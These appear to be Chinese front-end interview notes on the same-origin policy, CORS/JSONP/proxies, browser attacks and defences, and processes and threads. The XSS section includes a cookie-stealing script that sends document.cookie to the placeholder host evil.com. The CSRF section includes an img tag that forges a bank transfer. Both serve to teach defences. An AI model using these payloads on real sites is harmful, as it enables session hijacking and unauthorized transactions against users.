> 本部分主要是要针对于浏览器相关面试题中的补充，或者是面试中应该回答的总结。
>
> [浏览器工作原理与实践 (poetries.top)](https://blog.poetries.top/browser-working-principle/)

# 浏览器同源策略

## 介绍一下跨域

> [你可以轻松搞定跨域问题吗？先从浏览器的同源策略入手，跟住我！【渡一教育】_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1wu41187ut/?spm_id_from=333.788.recommend_more_video.2&vd_source=7ce3f834cb0c7108338f1996b4436d48)

### 1. 回答内容

跨域是由浏览器的同源策略造成的。同源策略规定了浏览器只能访问和操作与当前网页同协议、同域名、同端口的资源，否则就会发生跨域。跨域的目的是为了保护用户的隐私和数据安全，防止恶意网站窃取或篡改用户的信息

### 2. 为什么要有同源策略

- **Cookie、LocalStorage 和 IndexDB 无法读写**：这些都是浏览器提供的本地存储功能，用于保存用户的数据和偏好。如果**不同源**的网站可以随意访问这些数据，就可能导致用户的隐私泄露或数据被篡改。
- **DOM 和 Js对象无法获得**：DOM 是文档对象模型，是网页的结构和内容的表示。Js对象是 JavaScript 语言中的基本数据类型，用于存储和处理各种信息。如果不同源的网站可以操作这些对象，就可能导致网页的布局和功能被破坏或恶意修改。
- **限制AJAX请求不能发送**：防止其他网站的数据窃取

### 3. 细节

同源策略是浏览器的行为，是为了保护本地数据不被JavaScript代码获取回来的数据污染，<font color='red'>因此拦截的是客户端发出的请求回来的数据接收，即请求发送了，服务器响应了，但是无法被浏览器接收。</font>

## 跨域的解决方案

> - 蛋老师：[跨域的解决方法有哪些？JSONP的原理？CORS怎么使用？Nginx如何设置？\_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Ei4y1o7jK/?vd_source=7ce3f834cb0c7108338f1996b4436d48)
> - 渡一老师：
>   - CORS：[掌握CORS跨域请求，看这个视频就够了【渡一教育】\_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1fP411e71o/?spm_id_from=333.788.recommend_more_video.-1&vd_source=7ce3f834cb0c7108338f1996b4436d48)
>   - JSONP:[JSONP的原理是什么？它是如何实现跨域的？【渡一教育】\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1XX4y1Y7Eh/?spm_id_from=333.788.recommend_more_video.-1&vd_source=7ce3f834cb0c7108338f1996b4436d48)
>   - 正向代理：[跨域问题解决方案之代理【渡一教育】\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1Ng4y1P7KH/?spm_id_from=333.788.recommend_more_video.1&vd_source=7ce3f834cb0c7108338f1996b4436d48)

### 1. 实现方法简介

跨域的解决方法有多种，常见的有以下几种：

- [**JSONP**：](https://juejin.cn/post/6887425238045458446)[1](https://juejin.cn/post/6887425238045458446)[2](https://zhuanlan.zhihu.com/p/159060398)[3](https://www.cnblogs.com/fundebug/p/10329202.html)[4](https://zhuanlan.zhihu.com/p/132534931)[5](http://www.example.com/path/to/myfile.html?key1=value1&key2=value2)
- [**CORS**：一种标准化的跨域方案，它允许服务器在响应头中设置Access-Control-Allow-Origin字段，指定哪些域可以访问该服务器的资源。优点是支持各种HTTP方法，可以自定义请求头和响应头，安全可靠；缺点是需要服务器端配合设置，低版本浏览器不支持。适用于一些需要高安全性和灵活性的场景，如用户登录、文件上传等。](https://juejin.cn/post/6887425238045458446)[1](https://juejin.cn/post/6887425238045458446)[2](https://zhuanlan.zhihu.com/p/159060398)[3](https://www.cnblogs.com/fundebug/p/10329202.html)[4](https://zhuanlan.zhihu.com/p/132534931)[5](http://www.example.com/path/to/myfile.html?key1=value1&key2=value2)
- [**降域**：将不同子域的document.domain设置为相同的主域，从而实现同源。优点是简单方便，不需要服务器端设置；缺点是只能用于子域之间的跨域，不能跨协议或端口，可能存在安全风险。适用于一些属于同一个主域但不同子域的网站之间的通信场景，如电商网站和支付网站等。](https://juejin.cn/post/6887425238045458446)[1](https://juejin.cn/post/6887425238045458446)[2](https://zhuanlan.zhihu.com/p/159060398)[3](https://www.cnblogs.com/fundebug/p/10329202.html)[4](https://zhuanlan.zhihu.com/p/132534931)[5](http://www.example.com/path/to/myfile.html?key1=value1&key2=value2)
- [**PostMessage**：HTML5提供的一种API，它可以让不同源的窗口之间传递消息，从而实现跨域通信。优点是简单易用，支持多种数据类型，兼容性好；缺点是需要双方约定好消息格式和来源，否则可能导致数据混乱或泄露。适用于一些需要在不同窗口或iframe之间交换数据的场景，如网页嵌套、第三方登录等。](about:blank#)[1](https://juejin.cn/post/6887425238045458446)[2](https://zhuanlan.zhihu.com/p/159060398)[3](https://www.cnblogs.com/fundebug/p/10329202.html)[4](https://zhuanlan.zhihu.com/p/132534931)[5](http://www.example.com/path/to/myfile.html?key1=value1&key2=value2)

- **JSONP**
  - 利用 `<script>` 标签不受浏览器同源策略的影响，通过 src 属性，请求非同源的 js 脚本，并通过**函数调用**的形式，接收跨域接口响应回来的数据。
  - 优点是简单易用，兼容性好；
  - 缺点是只支持GET方法，不安全，可能遭受XSS攻击。
  - 适用于一些简单的数据获取场景，如天气预报、股票行情等。

- **CORS**（Cross-Origin Resource Sharing）跨域资源共享

  - 它允许服务器在响应头中设置Access-Control-Allow-Origin字段，指定哪些域可以访问该服务器的资源。
  - 优点是支持各种HTTP方法，可以自定义请求头和响应头，安全可靠；
  - 缺点是需要服务器端配合设置，低版本浏览器不支持。
  - 适用于一些需要高安全性和灵活性的场景，如用户登录、文件上传等

- **代理**
  - 它的原理是利用服务器端请求不会受到同源策略的限制，让服务器端作为中间人，转发客户端和目标服务器之间的请求和响应。

  - **正向代理**：在客户端配置一个代理服务器，如proxy或fiddler，将客户端的请求通过代理服务器发送到目标服务器，并将目标服务器的响应通过代理服务器返回给客户端。这样，客户端和目标服务器之间可以跨域，而代理服务器和目标服务器之间是同源的。优点是可以绕过一些网络限制，如防火墙或地域限制；缺点是需要在每个客户端上配置代理，可能影响用户体验。适用于一些需要访问受限资源或测试网络环境的场景，如科学上网、抓包分析等。

  - **反向代理**：在服务器端配置一个代理服务器，如nginx或apache，将客户端的请求转发到目标服务器，并将目标服务器的响应返回给客户端。这样，客户端和代理服务器之间是同源的，而代理服务器和目标服务器之间可以跨域。优点是可以隐藏目标服务器的真实地址，提高安全性和性能；缺点是需要额外的服务器资源和维护成本。适用于一些需要高安全性和高性能的场景，如电商网站、金融网站等。

- **WebSocket**：WebSocket是一种协议，可以实现跨域通信，支持全双工通信，可以保持长连接。

- **postMessage**：postMessage是HTML5新增的API，可以实现跨窗口通信，适用于在同一页面或不同页面的iframe之间进行通信。

### 2. 详解JSONP

> (JSON with Padding)

##### 1. JSONP的原理

由于浏览器同源策略的限制，网页中无法通过 Ajax 请求非同源的接口数据。但是 `<script>` 标签不受浏览器同源策略的影响，可以通过 src 属性（src属性可以设置url，表示请求地址），请求非同源的 js 脚本。通过`Content-Type: text/javascript`来设置返回文件的类型，<a href="#src返回">默认是JavaScript</a>。

因此，JSONP 的实现原理，就是通过 `<script>` 标签的 src 属性，请求跨域的数据接口，并通过**函数调用**的形式，接收跨域接口响应回来的数据。

##### 2. JSONP的实现

- 定义一个全局的回调函数，在JSONP响应返回时调用该函数

  ```js
   <script>
     function success(data) {
       console.log('获取到了data数据：')
       console.log(data)
     }
   </script>
  ```

- 动态创建script标签，设置其src属性为需要请求的URL，其中包括传递给后台的<font color='red'>参数</font>和<font color='red'>回调函数名称</font>。

  ```html
  <script src="http://ajax.frontend.itheima.net:3006/api/jsonp?callback=success&name=zs&age=20"></script>
  ```

- 后台接收到请求后，解析出请求参数和回调函数名称，将数据包装成一个函数调用的形式返回给前端。

- 前端接收到响应后，调用全局回调函数，将返回的数据传递给该函数，从而完成数据处理和展示。

##### 3. JSONP的缺点和注意

由于 JSONP 是通过 `<script>` 标签的 src 属性，来实现跨域数据获取的，所以，JSONP 只支持 GET 数据请求，不支持 POST 请求。

注意：**JSONP** **和** **Ajax** **之间没有任何关系**，不能把 JSONP 请求数据的方式叫做 Ajax，因为 JSONP 没有用到 XMLHttpRequest 这个对象。

### 3. 详解CORS

（Cross-Origin Resource Sharing）跨域资源共享

##### 1. CORS含义

CORS（Cross-Origin Resource Sharing）是一种机制，它允许在浏览器中运行的 Web 应用程序访问跨源服务器上的资源。CORS 是一个安全机制，用于限制通过浏览器发送的跨域请求对服务器资源的访问，以保护用户的隐私和安全。

##### 2. 工作原理

CORS 的工作原理是通过在服务器端设置一些特殊的 HTTP 头来允许跨域请求。

当浏览器发送跨域请求时，服务器会检查请求中的 Origin 头部，并决定是否允许该请求访问资源。

如果服务器允许该请求，那么它会在响应中包含一些特殊的头部，例如 Access-Control-Allow-Origin 和 Access-Control-Allow-Methods 等，以通知浏览器该请求已被授权。

##### 3. 请求过程

1. 浏览器向服务器发送跨域请求，并在请求头中包含 Origin 头部【协议+域名+端口】。
2. 服务器收到请求后检查 Origin 头部，并确定是否允许该请求访问资源。
3. 如果服务器允许该请求，那么它会在响应中包含 Access-Control-Allow-Origin 和 Access-Control-Allow-Methods 等头部，以授权该请求。
4. 浏览器收到响应后会检查 Access-Control-Allow-Origin 和 Access-Control-Allow-Methods 等头部，以确定该请求是否被授权。如果该请求被授权，那么浏览器就会将响应传递给 JavaScript 代码，并允许它访问资源。

### 4. 详解服务器代理

> [代理（proxy）跨域\_代理跨域\_奥特曼　的博客-CSDN博客](https://blog.csdn.net/m0_46846526/article/details/118151968)

##### 1. 本质

在服务器之间进行数据交互的过程中不存在跨域问题，因为服务器之间是通过 IP 地址和端口号来进行通信的，而不是通过域名。跨域问题主要是出现在**客户端浏览器**与**服务器**之间的交互中。

##### 2. 代理的介绍

服务器代理和反向代理都是代理服务器的一种形式，不同之处在于它们所处的位置和处理请求的方式。

服务器代理，也称为正向代理，是处于客户端和目标服务器之间的一台代理服务器，用于转发客户端请求并获取目标服务器的响应。客户端并不直接与目标服务器通信，而是通过服务器代理来实现。常见的应用场景包括突破网络访问限制、加速访问速度、隐藏真实IP等。

反向代理则是位于目标服务器和客户端之间的一台代理服务器（代理服务器与网站同源，或者设置CORS），用于将客户端的请求转发到目标服务器，并将目标服务器的响应返回给客户端。客户端并不知道自己实际访问的是哪台服务器，而是通过反向代理来实现。常见的应用场景包括负载均衡、安全保护、Web加速等。

总的来说，正向代理和反向代理的区别在于代理的方向不同，正向代理是客户端找代理，反向代理是代理找服务器。同时，反向代理更多的是用于服务器端的负载均衡和安全等问题，而正向代理更多的是用于客户端的网络访问问题。

# 浏览器安全



## 1. XSS攻击

> 相关资料：
>
> - [跨站脚本攻击XSS：为什么cookie中有httpOnly属性 | 浏览器工作原理与实践 (poetries.top)](https://blog.poetries.top/browser-working-principle/guide/part6/lesson33.html#_3-使用-httponly-属性)
> - [XSS网络攻击 - 原理，类型和实践_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1rg411v7B8/?spm_id_from=333.999.0.0&vd_source=7ce3f834cb0c7108338f1996b4436d48)
>
> * [前端面试题之浏览器原理篇](https://www.yuque.com/cuggz/interview/browser#afc79dc67e7ba920c635f1bbca68d162)
> * [手把手教你快速上手XSS攻击 - 掘金 (juejin.cn)](https://juejin.cn/post/7277786839841947706?searchId=202309192202275A2F4ABB969D942DEA09)
> * [前端安全系列（一）：如何防止XSS攻击？ - 美团技术团队 (meituan.com)](https://tech.meituan.com/2018/09/27/fe-security.html)

###  概念

==跨站脚本攻击XSS(Cross Site Scripting)==，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。

#### 描述

==恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的==。

当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。XSS攻击针对的是用户层面的攻击！

#### 攻击场景

- 可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。
- 可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。
- 可以通过修改 DOM伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。
- 还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。

### 分类

#### 反射型XSS攻击

##### 概念/攻击流程

1. 攻击者将恶意代码作为参数附加在URL中，诱导用户点击链接；
2. 服务端接收数据之后，并不会对这些参数进行任何处理，而是拼接在HTML中将它们返回给客户端。
3. 当客户端接收到这些参数时，就会将它们当作正常的HTML或JavaScript代码来解析和执行，从而触发攻击效果。

反射体现在：用户访问带有恶意代码的网址，浏览器就恶意代码再次==反射==给用户

这种攻击的特点是需要用户的主动参与，且攻击代码不会被存储在服务器上，只在当前请求中有效。

##### 常见场景

用户点击恶意链接

##### 实际案例1

假设有一个网站提供了一个搜索功能，用户可以输入关键字进行搜索，搜索结果会显示在页面上。如果这个网站没有对用户输入的关键字进行过滤或转义，那么攻击者就可以构造一个包含恶意代码的URL参数，URL参数为script代码。

例如：`http://www.example.com/search?keyword=<script>document.location='http://www.evil.com/?cookie='+document.cookie</script>`

当用户点击这个URL时，服务器端会将关键字参数原样拼接到响应内容(嵌入到了HTML源码)中，例如：

```html
<div>您搜索的关键字是：<script>document.location='http://www.evil.com/?cookie='+document.cookie</script></div>
```

这样，当浏览器接收到响应内容时，就会执行`<script>document.location='http://www.evil.com/?cookie='+document.cookie</script>`这段恶意代码，它会做两件事情：

1. 通过document.cookie获取用户的Cookie信息，并拼接到一个恶意网站的URL参数中。
2. 通过document.location将用户重定向到这个恶意网站。

这样，攻击者就可以在恶意网站上获取用户的Cookie信息，并利用它进行一些恶意操作，比如冒充用户身份、窃取用户数据等。同时，用户也被诱导到了一个可能含有更多恶意代码或内容的网站上，可能遭受更大的损失。

##### 实际案例2

例如，一个搜索页面的URL可能是这样的：`http://example.com/search?keyword=hello`，如果攻击者将`keyword`参数替换为`<script>alert('xss')</script>`，并将修改后的URL发送给用户，那么当用户点击该链接时，就会弹出一个对话框显示`xss`。

#### 存储型XSS攻击

##### 概念

这种攻击是通过将恶意代码提交到目标网站的数据库中，使得每次用户访问该网站时，都会加载并执行该代码。

这种攻击的特点是不需要用户的主动参与，且攻击代码会持久地保存在服务器上，影响范围更广。

##### 攻击流程

1. 攻击者将恶意代码提交到目标网站的数据库中，例如在评论中插入Javascript代码。

2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。

3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

**常见场景**

用户评论、私信相关

##### 案例1

例如，一个论坛网站允许用户发表评论，并将评论内容存储在数据库中。如果攻击者在评论中插入了`<script>stealCookie()</script>`，并成功提交了评论，那么当其他用户浏览该评论时，就会执行该脚本，从而导致攻击者窃取他们的Cookie信息。

#### DOM型XSS攻击

##### 概念

DOM-based XSS：这种攻击是利用前端js代码的漏洞，使得浏览器执行恶意代码。

它的特点是恶意代码不会经过服务器端的处理，服务端只是返回HTML文件，而恶意代码嵌入是在前端页面中完成的，在浏览器端的DOM解析和执行过程中产生。

##### 工作流程

1. 攻击者构造出特殊的URL，其中包含恶意代码。

2. 用户打开带有恶意代码的URL。

3. 用户浏览器接收到响应后解析执行，==前端 JavaScript 取出（不是直接嵌入到HTML中）== URL 中的恶意代码并执行。

4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

##### 案例1

例如，一个网页可能会根据URL中的`#`（hash值）后面的内容来改变页面的标题，如`http://example.com/page#title1`。如果攻击者将`#`后面的内容替换为`<img src=x onerror=alert('xss')>`，并将修改后的URL发送给用户，那么当用户访问该URL时，就会触发图片加载失败的错误事件，并执行其中的脚本。

##### 案例2

举个例子，假设有一个网站提供了一个显示当前URL的功能，用户可以输入任意的URL参数，网站会将其显示在页面上。如果这个网站没有对用户输入的URL参数进行过滤或转义，那么攻击者就可以构造一个包含恶意代码的URL参数，例如：

`http://www.example.com/showurl?name=<script>alert('XSS')</script>`

当用户点击这个URL时，网站会将name参数原样输出到页面上（此过程并不经过服务端），例如：

`<div>您输入的URL是：<script>alert('XSS')</script></div>`

这样，当浏览器接收到页面内容时，就会执行`<script>alert('XSS')</script>`这段恶意代码，弹出一个对话框显示“XSS”。当然，这只是一个简单的例子，实际上攻击者可以利用DOM型XSS攻击做更多的事情，比如盗取用户的Cookie、重定向用户到恶意网站、执行恶意操作等。

### 防御方法

防御反射型的XSS攻击，主要有以下几个方面：

> - 将特殊字符进行过滤或者转移，例如将< 变为 小于号`&lt;`
> - 限制可执行脚本的来源
> - 限制JS获取cookie等信息
> - 规范用户的输入

1. 对用户输入的数据进行合理的过滤或转义，避免将不可信的数据直接输出到响应内容中。例如，可以使用一些安全库或函数来对HTML特殊字符进行编码，如将<转换为&lt;，将>转换为&gt;等，这样就可以防止恶意代码被浏览器解析为HTML标签或属性。
2. 设置HTTP头中的Content-Security-Policy来限制可执行的脚本来源，只允许从可信的域名加载脚本，禁止内联脚本或动态生成的脚本。这样就可以防止恶意代码被嵌入到响应内容中或从外部加载。
3. 设置Cookie为HttpOnly来防止JavaScript访问Cookie，这样就可以防止恶意代码通过document.cookie获取用户的Cookie信息，并发送给攻击者。
4. 对用户输入的数据进行有效性验证，只接受指定长度范围、格式适当、符合预期的内容，对其他不符合预期的内容一律拒绝或忽略。这样就可以防止恶意代码通过构造异常或无效的参数来绕过过滤或转义。
5. 【**存储型额外加一条**】对服务器端存储的数据进行定期的扫描和清理，发现并删除任何可疑的恶意代码。这样就可以防止恶意代码长期存在于服务器上，并影响更多的用户。

## 2. CSRF跨域请求伪造攻击

### 概念

XSRF攻击，也叫CSRF(Cross-site request forgery)攻击，是跨站请求伪造的缩写。

他的本质是==利用cookie会在同源请求中携带发送给服务器的特点，以此来实现用户的冒充==。

### 案例

它的流程是这样的：

1. 用户登录了一个正常的网站A，网站A给用户的浏览器发送了一个cookie，用来保存用户的登录状态。
2. 用户在没有退出网站A的情况下，访问了一个恶意的网站B，网站B上有一些隐藏的链接或图片，这些链接或图片的地址其实是网站A上的一些敏感操作，比如转账、删除账号等。
3. 用户的浏览器会自动向网站A发送这些请求，同时携带着网站A的cookie，这样网站A就认为这些请求是用户本人发出的，从而执行了恶意操作。

举个例子，假设银行网站A有一个转账功能，它的URL是：

https://bank.example.com/withdraw?account=AccoutName&amount=1000&for=PayeeName

如果用户登录了银行网站A，并且没有退出，然后访问了恶意网站B，恶意网站B上有这样一个图片标签：

`<img src="https://bank.example.com/withdraw?account=Alice&amount=1000&for=Badman" />`

那么用户的浏览器就会向银行网站A发送这个转账请求，并且带上银行网站A的cookie，银行网站A就会认为用户想要转账给Badman，并执行了这个操作。

### 防御方法

#### 同源检测【见面经】

origin和refer

#### token

使用token来解决单一cookie验证的方式

#### sameSite

##### 概念

设置cookie属性的时候设置`samesite`为严格模式，限制cookie作为第三方使用。当你访问恶意网站时，浏览器就不会携带原的cookie发送请求，Cookie的`samesite`属性用来限制第三方cookie，从而减少安全风险。

##### 案例说明

对于`store.com` 页面加载 `comments.com` 的评论系统（`store.com`中需要加载`comments.com`的内容）而言，`comments.com` 的cookie是由 `comments.com` 设置的，并且它们的发送规则是根据 `comments.com` 为这些cookie设置的 `SameSite` 属性来决定的。==浏览器在发送请求到 `comments.com` 时，会检查储存在用户浏览器中的 `comments.com` 的cookie，并判断其 `SameSite` 属性值来决定是否应随请求一起发送。==

它可以设置三个值：Strict、Lax和None。

- Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie（指的是完全禁止第三方cookie被携带）。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话（假设浏览器中以前存储了InfoQ 的cookie），那么这些 Cookie 是不会被发送到 InfoQ 的服务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。
- Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。
- 而如果使用 None 的话，在任何情况下都会发送 Cookie 数据。

设置了Strict或Lax以后，基本就杜绝了CSRF攻击。当然，前提是用户浏览器支持samesite属性。

##### 案例

例如，假设你是一个银行网站的用户，你在浏览器中登录了银行网站，并且在该网站上进行了一些操作，比如查询余额、转账等。这时，你的浏览器会保存一个包含你身份信息的cookie，用于在后续的请求中验证你的身份。

然而，如果你在同一个浏览器中访问了一个恶意网站，该网站可能会利用你的cookie来伪造一些请求，向银行网站发送一些你不想做的操作，比如转账给攻击者、修改密码等。这就是CSRF攻击。

要防范CSRF攻击，银行网站可以在设置cookie时添加samesite属性，并将其设为Strict或Lax。这样，当你访问恶意网站时，浏览器就不会携带银行网站的cookie发送请求，从而避免了CSRF攻击。

#### 自定义属性

在HTTP头中自定义属性并验证：这种方法是通过JavaScript在每个请求中添加一个自定义的HTTP头属性，并在服务器端验证该属性是否存在或者正确。这样可以防止攻击者利用img、script等标签发起请求，因为这些标签无法设置自定义的HTTP头属性。

- 例如，如果银行网站提供了一个转账的链接，那么可以通过JavaScript来拦截该链接，并向服务端发送一个带有自定义HTTP头属性（如X-CSRF-Token）的XMLHttpRequest请求，并在服务端验证该属性是否与用户保存在服务器端或者cookie中的token相匹配：

```html
<a href="/transfer?amount=100&to=friend" id="transfer-link">转账给朋友</a>
<script>
    // 获取转账链接的元素
    var link = document.getElementById("transfer-link");
    // 绑定点击事件
    link.addEventListener("click", function (event) {
        // 阻止默认的跳转行为
        event.preventDefault();
        // 创建一个XMLHttpRequest对象
        var xhr = new XMLHttpRequest();
        // 设置请求的方法和地址
        xhr.open("GET", link.href);
        // 设置自定义的HTTP头属性，值为用户保存在服务器端或者cookie中的token
        xhr.setRequestHeader("X-CSRF-Token", getUserToken());
        // 设置请求的回调函数
        xhr.onload = function () {
            if (xhr.status === 200) {
                // 如果请求成功，显示成功信息
                alert("转账成功");
            } else {
                // 如果请求失败，显示错误信息
                alert("转账失败");
            }
        };
        // 发送请求
        xhr.send();
    });
</script>
```

```javascript
// 获取请求头中的X-CSRF-Token属性
var token = req.headers["X-CSRF-Token"];
// 获取用户保存在服务器端或者cookie中的token
var userToken = getUserToken(req);
// 判断两个token是否相等
if (token !== userToken) {
    // 如果不相等，拒绝该请求，并返回错误信息
    res.status(403).send("Invalid Token");
    return;
}
// 如果相等，继续处理该请求
...
```

但是这种方法需要浏览器支持XMLHttpRequest对象，并且对于一些不支持JavaScript或者禁用JavaScript的用户也无效。

## 3. DDos攻击

### 概念

DDoS攻击（分布式拒绝服务攻击）是一种网络攻击，攻击者通过将大量的网络流量洪泛到目标服务器或网络资源上，从而使其无法处理合法的请求，导致服务不可用或响应速度严重下降。DDoS攻击通常涉及由数以千计的被攻击者控制的网络设备组成的僵尸网络（botnet），这些设备同时向目标发送请求。 

### 案例

2016年10月，Dyn（一个大型域名解析服务提供商）遭到了DDoS攻击，该攻击通过利用大量的物联网（IoT）设备发起了巨量的流量，导致了许多主要网站和在线服务的中断，包括Twitter、Netflix、Reddit等。 

### 防御

- **带宽扩展**: 通过增加服务器的宽带容量来吸收或缓解高流量攻击。 
- **流量分析和监控**: 使用自动化工具来检测流量异常，及时识别可能的攻击行为。 
- **内容分发网络（CDN）**: 在全球多个地点部署服务器的网络，可以分散流量，提高冗余和可用性。 
- **防火墙和威胁管理系统**: 使用专门的网络设备或软件来识别和过滤DDoS攻击流量。
- **DDoS缓解服务**: 与专业的DDoS防护服务提供商合作，利用他们的资源和专业知识来保护你的网络不受攻击。 
- **响应计划**: 准备好事先制定的应急计划和对策，以便在攻击发生时快速响应。 通过这些策略，企业和组织可以提高它们的网络和资源对抗DDoS攻击的能力。

## 补充概念

### 1. 第三方cookie

#### 概念

第三方cookie是由非当前访问网站的域设置的cookie。当你访问一个网站时，该网站可能包含一些来自其他域的资源，如广告、图片、视频等。这些资源可能会设置自己的cookie，即第三方cookie。 

#### 案例

假设你访问一个新闻网站 `news.com`，这个网站在其中嵌入了来自 `advertiser.com` 的广告。当你浏览 `news.com`： 

1. `news.com` 在浏览器中设置了一些cookie（第一方cookie），这些cookie由 `news.com` 的服务器创建，用于跟踪用户会话或者存储用户偏好设置等信息。 
2. 同时，`advertiser.com` 的广告脚本也可能在你的浏览器中设置cookie（第三方cookie）。尽管你直接访问的是 `news.com`，但由于页面中嵌入了来自 `advertiser.com` 的内容，所以 `advertiser.com` 也能够在你的浏览器中设置和读取它自己的cookie。 
3. 当你在不同的网站间浏览时，这些网站如果都嵌入了来自 `advertiser.com` 的广告或跟踪脚本，`advertiser.com` 就可以通过它的第三方cookie跟踪你在不同网站上的行为，用以建立起你的浏览习惯和兴趣档案，进而提供定制化的广告和内容。 

#### 关于隐私和限制

第三方cookie因跨站跟踪问题备受争议，许多人认为它侵犯了隐私权。因此，越来越多的浏览器实现了对第三方cookie的限制或禁止。例如，Safari的智能跟踪防护（Intelligent Tracking Prevention，ITP）和Firefox的增强跟踪保护（Enhanced Tracking Protection，ETP），都默认阻止了第三方cookie。Chrome也宣布了计划逐步淘汰支持第三方cookie。 随着对隐私保护意识的提高和相关法规的加强（如GDPR和CCPA），第三方cookie的使用和跨站跟踪行为正在逐渐受到限制，网站和广告商正寻找新的方法来个性化内容和广告，同时尊重用户的隐私选择。

# 进程和线程

## 1. 进程与线程的概念

进程是系统资源分配和保护的基本单位，每个进程都有自己独立的地址空间和资源。

线程是CPU调度和分派的基本单位，每个线程都属于某个进程，一个进程可以有多个线程，它们共享进程的地址空间和资源。

直接回答下面的内容：

一个进程就是一个程序的运行实例。详细解释就是，启动一个程序的时候，操作系统会为该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的主线程，我们把这样的一个运行环境叫进程。

线程理解为进程中负责执行具体任务的最小单位。线程拥有自己的堆栈空间和程序计数器，它是操作系统调度（为了分配处理器时间）的基本单位。在一个进程中，可以有多个线程同时运行，共享进程的内存和资源，但每个线程都独立执行其指派的任务。这种方式允许并发执行，可以提高程序的执行效率和响应速度。

## 2. 进程与线程的区别

- **资源分配和保护**：进程是系统资源分配和保护的基本单位，每个进程都有自己独立的地址空间和资源。线程是CPU调度和分派的基本单位，每个线程都属于某个进程，一个进程可以有多个线程，它们共享进程的地址空间和资源。
- **通信方式**：进程之间是相互隔离的，如果要进行通信，需要使用进程间通信（IPC）的方法，如管道、信号、共享内存、消息队列等。线程之间是相互可见的，如果要进行通信，可以直接访问共享内存，但是需要使用同步和互斥的手段，如锁、信号量、条件变量等，来保证数据的一致性。
- **开销和效率**：进程的创建和销毁比较耗费系统资源，进程的切换需要保存和恢复多个寄存器和内存映像。线程的创建和销毁比较轻量级，线程的切换只需要保存和恢复少数寄存器和栈指针。因此，线程比进程更适合频繁切换的场景，如用户界面、网络服务等。
- **并行和并发**：进程可以利用多核或多机实现并行执行，提高系统的吞吐量。线程可以利用多核实现并发执行，提高程序的响应速度。并行是指同时执行多个任务，而并发是指交替执行多个任务。

## 3. 进程间通讯

- 管道是通过内核缓冲区来实现通信的。内核缓冲区是一块内存空间，可以被多个进程访问。一个进程向缓冲区写入数据，另一个进程从缓冲区读取数据。这样就实现了数据的传输。管道有两个文件描述符，一个用于写，一个用于读。管道的数据流动是单向的，要实现双向通信，需要创建两个管道。管道的读写操作都是阻塞的，也就是说，如果缓冲区为空，读操作会等待直到有数据可读；如果缓冲区满了，写操作会等待直到有空间可写。管道的特点是简单易用，但是也有一些局限性，比如只能在有亲缘关系的进程间使用（无名管道），或者需要一个文件名作为标识（有名管道）。

- 消息队列是通过内核维护的消息链表来实现通信的。消息队列是一种存放在内核中的数据结构，由一个标识符来唯一标识。一个进程向消息队列发送一条消息，另一个进程从消息队列接收一条消息。这样就实现了数据的传输。消息队列的特点是可以传输任意格式的数据，并且可以按照消息的类型或者优先级来选择接收哪条消息。消息队列的读写操作也都是阻塞的，但是可以设置为非阻塞模式。消息队列的优点是灵活可靠，但是也有一些缺点，比如每条消息都有额外的开销（消息类型和长度），并且占用内核空间。

- 信号量是通过内核维护的计数器来实现通信的。信号量是一种用于控制多个进程对共享资源访问的机制。信号量的值表示当前可用的资源数量。一个进程在访问共享资源之前，需要对信号量进行减一操作（P操作），如果信号量为零，则表示没有可用资源，进程会被阻塞；一个进程在释放共享资源之后，需要对信号量进行加一操作（V操作），如果有其他进程在等待资源，则唤醒其中一个进程。这样就实现了对共享资源的保护和同步。信号量的特点是安全有效，但是也有一些问题，比如需要避免死锁和饥饿等情况。

## 4. 死锁

死锁是指两个或多个进程或线程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，如果没有外力干预，它们都将无法继续执行。

- 系统资源不足。当系统中的某些资源数量有限，而多个进程同时请求这些资源时，就可能发生死锁。例如，打印机、磁带机等设备是不可剥夺的资源，如果一个进程占用了这些资源，其他进程就只能等待。
- 进程推进顺序不合理。当进程在运行过程中，请求和释放资源的顺序不恰当时，也可能导致死锁。例如，两个进程分别占用了两个资源，并且都请求对方的资源，就会形成一个循环等待的状态。
- 资源分配不当。当系统采用了一些不合理的资源分配策略时，也可能引起死锁。例如，静态分配方式要求进程在运行之前就申请所有需要的资源，这样会导致资源的低效利用和长时间等待；动态分配方式要求进程在运行过程中根据需要申请和释放资源，这样会增加系统的开销和复杂度。
